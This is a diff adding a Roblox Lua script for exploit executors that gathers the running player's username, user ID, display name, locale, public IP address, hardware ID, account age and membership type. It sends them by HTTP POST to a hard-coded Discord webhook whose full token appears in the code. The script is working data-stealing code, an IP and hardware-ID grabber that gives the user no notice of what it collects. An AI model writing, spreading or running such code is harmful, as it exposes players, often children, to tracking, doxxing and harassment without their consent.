@@ -1,0 +1,72 @@
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local HttpService = game:GetService("HttpService")
+local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+
+local LocalPlayer = Players.LocalPlayer
+local DName = LocalPlayer.DisplayName
+local Name = LocalPlayer.Name
+local UserId = LocalPlayer.UserId
+local Country = game.LocalizationService.RobloxLocaleId
+local GetIp = game:HttpGet("https://v4.ident.me/")
+local GetData = game:HttpGet("http://ip-api.com/json")
+local GetHwid = RbxAnalyticsService:GetClientId()
+local AccountAge = LocalPlayer.AccountAge
+local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
+local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
+
+local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name
+
+local webhookcheck =
+    (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or
+    (secure_load and "Sentinel") or
+    (pebc_execute and "ProtoSmasher") or
+    (KRNL_LOADED and "Krnl") or
+    (is_sirhurt_closure and "SirHurt") or
+    (identifyexecutor():find("ScriptWare") and "Script-Ware") or
+    ("Unsupported")
+
+local url = "https://discord.com/api/webhooks/1032673751688552560/-n5KIFjer9ylTH5b5r4IIPov5igfQSOJZ5ACqMytq74vG0jxulZsF8gXfwbzIFIOWmzs"
+
+local data = {
+    content = "",
+    embeds = {{
+        title = "Información del jugador",
+        color = tonumber("FF0000", 16),
+        fields = {
+            { name = "Nombre del jugador", value = Name, inline = true },
+            { name = "ID del jugador", value = UserId, inline = true },
+            { name = "Nombre de pantalla", value = DName, inline = true },
+            { name = "País", value = Country, inline = true },
+            { name = "IP", value = GetIp, inline = true },
+            { name = "HWID", value = GetHwid, inline = true },
+            { name = "Edad de la cuenta", value = AccountAge .. " días", inline = true },
+            { name = "Tipo de membresía", value = MembershipType, inline = true },
+            { name = "Nombre del juego", value = GAMENAME, inline = true },
+            { name = "Executor", value = webhookcheck, inline = true }
+        },
+        footer = {
+            text = "Enviado desde Roblox",
+            icon_url = "https://www.roblox.com/favicon.ico"
+        },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
+    }}
+}
+
+local newdata = HttpService:JSONEncode(data)
+
+local headers = {
+    ["content-type"] = "application/json"
+}
+
+local request = http_request or request or HttpPost or syn.request
+
+local abcdef = {
+    Url = url,
+    Body = newdata,
+    Method = "POST",
+    Headers = headers
+}
+
+request(abcdef)
+wait(1)
